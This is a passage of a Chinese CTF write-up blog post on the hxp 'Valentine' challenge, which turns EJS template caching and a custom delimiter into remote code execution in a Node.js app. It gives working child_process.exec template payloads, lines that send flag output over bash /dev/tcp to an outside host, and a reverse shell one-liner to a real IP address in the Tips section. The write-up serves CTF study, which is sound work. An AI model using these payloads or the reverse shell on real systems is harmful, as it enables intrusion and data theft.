+<p>可以看出ejs为了生产环境的效率，会存储初次被传入的模板解析结果，并省略后续的解析。为了更换模板分隔符，需要在首次传入就传入参数 <code>delimiter=?</code> ，但由于源码”app.js”中：</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/template&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmpl = req.<span class="property">body</span>.<span class="property">tmpl</span>;</span><br><span class="line">  <span class="keyword">let</span> i = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>((i = tmpl.<span class="title function_">indexOf</span>(<span class="string">&quot;&lt;%&quot;</span>, i+<span class="number">1</span>)) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tmpl.<span class="title function_">substring</span>(i, i+<span class="number">11</span>) !== <span class="string">&quot;&lt;%= name %&gt;&quot;</span>) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">message</span>:<span class="string">&quot;Only &#x27;&lt;%= name %&gt;&#x27; is allowed.&quot;</span>&#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> uuid;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">  &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(<span class="string">`views/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, tmpl);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write Valentine&#x27;s card&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> name = req.<span class="property">body</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/<span class="subst">$&#123;uuid&#125;</span>?name=<span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>最后的自动重定向会自动污染参数，因此需要用burp抓包来阻止该重定向。由于要生成模板就会调用该函数，因此重定向是无法用源码的信息绕过的，同时生成的模板名称是随机的，若不借助重定向的请求我们将无法获取新生成模板的信息，因此最后唯一的解法就是burp抓包阻止重定向，并发出一个有正确payload的包来初始化ejs的模板参数。</p>
+<p>被缓存的函数的键是对应文件的路径，但这不代表缓存的函数被存在这些文件中，实际上它们被放在node服务器的缓存里。</p>
+<hr>
+<p>此时新建一个docker环境并测试，利用burp截取重定向并发包，尝试RCE在”&#x2F;tmp&#x2F;“下新建一个”rceProof”文件夹</p>
+<p>由于docker起在本地，burp需要抓本地的包，此时需要查看本地WLAN的IP地址，通过该地址来访问本地的服务器，如node原本起在：<code>localhost:3000</code> ，此时需要通过：<code>192.168.0.109:3000</code> 去访问该网页，然后利用burp将其代理到 <code>127.0.0.1:84</code> 端口。</p>
+<p>写入payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;mkdir /tmp/rceProof&#x27;) ?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>抓包后篡改参数，放包，查看docker内环境的变化：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node@56261be35ca5:/tmp$ ls</span><br><span class="line">rceProof  v8-compile-cache-0</span><br></pre></td></tr></table></figure></div>
+
+<p>发现rce成功，更换payloadrevshell即可。</p>
+<p>虽然提供了一个elf文件”readflag”看似用于读取flag，但实际上在命令行中无法直接执行他，提示必须在服务器上调用该elf才能获取flag。经测试，rce直接执行该命令不能直接将flag打回到前端，”.&#x2F;readflag”也不行，因此还是要将其打出网，既然如此，直接反弹shell后cat flag也能获取flag。</p>
+<hr>
+<p>测试”readflag”在服务器上的效果：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;./readflag &gt;&amp; /dev/tcp/IP/23333&#x27;) ?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>会发现这个payload无效，服务器上没有任何回显，更换payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c &quot;./readflag &gt;&amp; /dev/tcp/IP/23333&quot;&#x27;) ?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>成功得到回显：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute this binary on the server to get the flag!</span><br><span class="line">something is wrong: couldn&#x27;t open /flag.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>也许是node默认的shell不是bash，好像只有bash能操作到 <code>/dev/tcp</code> 设备文件。在linux中反引号中的命令会被自动执行，因此他实际上代表着执行结果的字符串：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">festu@LAPTOP-PEM2QSB5:/tmp$ cat 233.txt</span><br><span class="line">123</span><br><span class="line">festu@LAPTOP-PEM2QSB5:/tmp$ `cat 233.txt`</span><br><span class="line">123: command not found</span><br></pre></td></tr></table></figure></div>
+
+<p>因此payload中不需要加上反引号。</p>
+<p>关于此处readflag失效的原因，所谓在服务器上执行是指下载的源码中的flag是假的，读取不到是因为自己dockerfile修改了，实际上flag被放在”&#x2F;flag.txt”位置，该二进制文件确实可以读取到flag，但是仍然需要打出网，因此为什么不弹shell呢？</p>
+<hr>
+<p>更换docker后测试readflag：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node@f941177dc793:/$ ./readflag</span><br><span class="line">execute this binary on the server to get the flag!</span><br><span class="line">hxp&#123;DUMMY&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>直接用容器的shell测试，能够成功读取到flag。由于是运行elf文件而非执行固定命令，因此需要用 <code>/readflag</code> 指定文件路径而不能只输入 <code>readflag</code> </p>
+<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul>
+<li><p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/81.69.227.204/23333 0&gt;&amp;1&quot;</code> 弹shell到自己的服务器<br><code>ps aux</code> 可以查看当前在运行的所有进程，获取pid后用 <code>kill -9 pid</code> 来杀死进程</p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-9" >Node.js 常见漏洞参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li><p>Node.js：</p>
+<p><code>require(&#39;child_process&#39;).exec(&#39;calc&#39;)</code> 利用windows的shell弹出计算器</p>
+</li>
+<li><p>Node.js原型链测试：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Object</span></span><br><span class="line">&#123;&#125;.<span class="property">__proto__</span></span><br><span class="line">-&gt; [<span class="title class_">Object</span>: <span class="literal">null</span> prototype] &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property">__proto__</span></span><br><span class="line">-&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">a</span>: <span class="number">1</span>&#125;.<span class="property">__proto__</span></span><br><span class="line">-&gt; [<span class="title class_">Object</span>: <span class="literal">null</span> prototype] &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array</span></span><br><span class="line">[].<span class="property">__proto__</span></span><br><span class="line">-&gt; <span class="title class_">Object</span>(<span class="number">0</span>) []</span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="property">__proto__</span></span><br><span class="line">-&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">[<span class="string">&quot;1&quot;</span>, <span class="number">2</span>].<span class="property">__proto__</span></span><br><span class="line">-&gt; <span class="title class_">Object</span>(<span class="number">0</span>) []</span><br><span class="line"></span><br><span class="line"><span class="comment">// fucntion</span></span><br><span class="line"><span class="title class_">Function</span>.<span class="property">__proto__</span></span><br><span class="line">-&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">f.<span class="property">__proto__</span></span><br><span class="line">-&gt; &#123;&#125;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>在powershell中直接使用 <code>set NODE_ENV=production</code> 并不能为后续启动的服务器设置到环境变量，必须在启动命令前捆绑设置环境变量。</p>
+</li>
+<li><p>通过 <code>process.env.[envName]</code> 可以查看node环境变量的值</p>
+</li>
+<li><p><code>chrome://inspect/#devices</code> 可以访问到chrome的开发工具，其中包括了node的调试工具及远程连接地址。</p>
+</li>
+</ul>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> hxp</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-03-26 05:15:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-03-26 05:16:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/03/26/Security/CTF/hxp/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">hxp</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Valentine"><span class="nav-text">Valentine</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">函数调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tips"><span class="nav-text">Tips</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
